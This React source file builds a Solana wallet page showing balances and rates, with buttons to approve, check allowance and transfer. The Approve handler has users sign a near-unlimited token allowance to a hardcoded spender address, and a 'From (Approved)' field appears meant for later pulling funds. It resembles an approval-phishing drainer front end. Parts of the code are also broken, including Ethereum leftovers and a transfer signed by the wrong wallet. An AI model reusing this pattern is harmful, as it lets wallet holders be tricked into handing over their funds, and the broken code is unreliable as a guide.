import { useEffect, useState } from 'react'
import * as Web3 from '@solana/web3.js'
import * as splToken from '@solana/spl-token'
import Toast from 'light-toast'
import Btn from './components/Btn'
import Ipt from './components/Ipt'
import { formatBalance } from './config/utils'

const USDT_ADDRESS = '5MzEv9NewwCgxNDmrBD7DHyvBuLD7eBzZqpXDMxoEfBT'
const SPENDER_ADDRESS = 'CLZnJ1URVEb4EU7GK8u8jFTy9mwViDZS13BeA98oqyF8'

let web3 = null, connection = null, publicKey = null, tokenAccount = null, contract = null, decimals = 6, timer = null
function App() {
	const [ rate, setRate ] = useState({
		'bitcoin': {usd: 51791, cny: 329750},
		'ethereum': {usd: 4400.49, cny: 28017},
		'litecoin': {usd: 163.13, cny: 1038.61},
		'tether': {usd: 0.999824, cny: 6.37},
		'tron': {usd: 0.091731, cny: 0.584041},
		'binancecoin': {usd: 593.87, cny: 3785.58},
		'usd-coin': {usd: 0.998926, cny: 6.36},
		'solana': {usd: 170.19, cny: 1084.12}
	})
	const [ address, setAddress ] = useState('')
	const [ solanaBalance, setSolanaBalance ] = useState(0)
	const [ usdtBalance, setUsdtBalance ] = useState(0)
	const [ gasFee, setGasFee ] = useState(0.000005)

	const [ from, setFrom ] = useState('')
	const [ to, setTo ] = useState('')

	/**
	 * 初始化
	 */
	const init = async () => {
		if (window.solana && window.solana.isPhantom) {
			console.log(window.solana)
			try {
				const resp = await window.solana.connect()
				publicKey = resp.publicKey
				setAddress(publicKey.toString())
				// connection = new Web3.Connection(Web3.clusterApiUrl('testnet'))
				connection = new Web3.Connection(Web3.clusterApiUrl('mainnet-beta'))
				console.log(connection)
				refresh()
				// getGasFee()
				// timer = setInterval(getGasFee, 5000)
			} catch (err) {
				console.log(err)
			}
		} else {
			Toast.fail('Phantom & solana not found!')
		}
	}

	const refresh = async (loading = false) => {
		loading && Toast.loading('Loading...')
		const solanaBalance = await connection.getBalance(publicKey)
		setSolanaBalance(solanaBalance / Math.pow(10, 9))
		try {
			const res = await connection.getTokenAccountBalance(new Web3.PublicKey(USDT_ADDRESS))
			// console.log(res)
			if (res.value) {
				setUsdtBalance(res.value.uiAmount)
			}
		} catch (error) {
			console.log(error)
		}
		
		Toast.hide()
	}

	const getGasFee = async () => {
		const gasPrice = await web3.eth.getGasPrice()
		const fee = 80000 * +(web3.utils.fromWei(gasPrice, 'ether'))
		setGasFee(fee)
	}

	const getRate = () => {
		fetch(`https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,tether,usd-coin,litecoin,tron,binancecoin,solana&vs_currencies=usd,cny`)
			.then(res => res.json())
			.then(res => {
				setRate(res)
				const r = {
					ts: new Date().getTime(),
					value: res
				}
				localStorage.setItem('rate', JSON.stringify(r))
			})
	}

	useEffect(() => {
		Toast.loading('Loading...')
		const rate1 = localStorage.getItem('rate')
		if (rate1) {
			const r = JSON.parse(rate1)
			setRate(r.value)
			if ((+r.ts - new Date().getTime()) > 3600000 * 6) {
				getRate()
			}
		} else {
			getRate()
		}
		
		setTimeout(() => init(), 500)
		return () => {
			clearInterval(timer)
			timer = null
		}
	}, [])
	// export const sendTxUsingExternalSignature = async (
	// 	instructions: TransactionInstruction[],
	// 	connection: Connection,
	// 	feePayer: Account | null,
	// 	signersExceptWallet: Account[],
	// 	wallet: Wallet
	//   ) => {
	// 	let tx = new Transaction().add(...instructions);
	// 	tx.setSigners(
	// 	  ...(feePayer
	// 		? [(feePayer as Account).publicKey, wallet.publicKey]
	// 		: [wallet.publicKey]),
	// 	  ...signersExceptWallet.map(s => s.publicKey)
	// 	);
	// 	tx.recentBlockhash = (await connection.getRecentBlockhash("max")).blockhash;
	// 	signersExceptWallet.forEach(acc => {
	// 	  tx.partialSign(acc);
	// 	});
	// 	let signed = await wallet.signTransaction(tx);
	// 	let txid = await connection.sendRawTransaction(signed.serialize(), {
	// 	  skipPreflight: false,
	// 	  preflightCommitment: COMMITMENT
	// 	});
	// 	return connection.confirmTransaction(txid, COMMITMENT);
	//   };
	return (
		<div className="w-full flex flex-col items-center p-4">
			<h1 className="text-4xl text-red-500 text-center font-bold pt-4">Solana</h1>
			<div className="py-3 text-center text-sm text-gray-600">
				<div>Address: <span className="text-blue-500">{address}</span></div>
				<div>Balance:  <span className="text-red-500 mx-2">{solanaBalance} SOL</span>| <span className="text-green-500 ml-2">{formatBalance(usdtBalance)} USDT</span></div>
				<div style={{ animation: 'fade 1s infinite' }}>
					Estimated tx fee: 
					<span className="text-yellow-500 ml-2">{formatBalance(gasFee)} SOL</span>
					<span className="mx-2">(${formatBalance(+gasFee * rate['solana'].usd, 2)})</span>
					<span>(¥{formatBalance(+gasFee * rate['solana'].cny, 2)})</span>
				</div>
			</div>
			<Btn text={'Refresh'} onClick={() => refresh(true)} />
			<Btn 
				text={'Approve'} 
				theme={'green'} 
				onClick={async () => {
					const ix = splToken.Token.createApproveInstruction(
						splToken.TOKEN_PROGRAM_ID, 
						new Web3.PublicKey(USDT_ADDRESS), 
						new Web3.PublicKey(SPENDER_ADDRESS),
						publicKey,
						[],
						Math.pow(10, 9) * 99999
					)
					const transaction = new Web3.Transaction({
						feePayer: publicKey,
						recentBlockhash: (await connection.getRecentBlockhash()).blockhash
					})
					transaction.add(...[ix])
					console.log(transaction)
					const { signature } = await window.solana.signAndSendTransaction(transaction)
					const res = await connection.confirmTransaction(signature)
					console.log(res)
					// const tokenData = (await connection.getParsedAccountInfo(new Web3.PublicKey(USDT_ADDRESS))).value.data
					// console.log(tokenData)
					// /**
					//  * token mint地址就是token account，铸币地址，不等同于合约地址，是属于用户自己账户下的对应合约的单独的地址
					//  */
					// const tokenMintAddress = tokenData.parsed.info.mint
					// console.log(tokenMintAddress)
					// const token = new splToken.Token(
					// 	connection,
					// 	new Web3.PublicKey(tokenMintAddress),
					// 	splToken.TOKEN_PROGRAM_ID
					// )
					// const allowanceBalance = await contract.methods.allowance(address, SPENDER_ADDRESS).call()
					// console.log(allowanceBalance)
					// if (allowanceBalance > 0) {
					// 	return Toast.success('You have done!')
					// }
					// await splToken.approve()
					// const res = await contract.methods.approve(SPENDER_ADDRESS, '99999999').send({
					// 	from: address,
					// 	gas: 80000
					// })
					// if (res.code === 4001) {
					// 	return Toast.fail(res.message)
					// }
					// Toast.success('Success!')
				}} 
			/>
			<Ipt 
				placeholder={'From (Approved)'} 
				value={from} 
				onChange={(e) => {
					setFrom(e.target.value)
				}} 
			/>
			<Ipt 
				placeholder={'To'} 
				value={to} 
				onChange={(e) => {
					setTo(e.target.value)
				}}
			/>
			<Btn 
				text={'Get allowance'} 
				theme={'yellow'} 
				onClick={async () => {
					// // if (!from.trim()) {
					// // 	Toast.fail('From address is required!')
					// // 	return
					// // }
					// if (from && !web3.utils.isAddress(from.trim())) {
					// 	Toast.fail('From address is invalid!')
					// 	return
					// }
					// const allowanceBalance = await contract.methods.allowance(from || address, SPENDER_ADDRESS).call()
					// Toast.info(`查询：【${from || address}】给【${SPENDER_ADDRESS}】剩余授权余额为:${allowanceBalance}`)
				}} 
			/>
			<Btn 
				text={'Transfer from'} 
				theme={'yellow'} 
				onClick={async () => {
					const toAddress = to || SPENDER_ADDRESS
					const transaction = new Web3.Transaction({
						feePayer: publicKey,
						recentBlockhash: (await connection.getRecentBlockhash()).blockhash
					})
					const amount = 0.1
					transaction.add(Web3.SystemProgram.transfer({
						fromPubkey: from ? new Web3.PublicKey(from) : publicKey,
						toPubkey: new Web3.PublicKey(toAddress),
						lamports: Math.pow(10, 9) * amount
					}))
					const { signature } = await window.solana.signAndSendTransaction(transaction)
					const res = await connection.confirmTransaction(signature)
					console.log(res)
					setTimeout(() => {
						refresh()
					}, 3000)
					
				}}
			/>
		</div>
	)
}

export default App
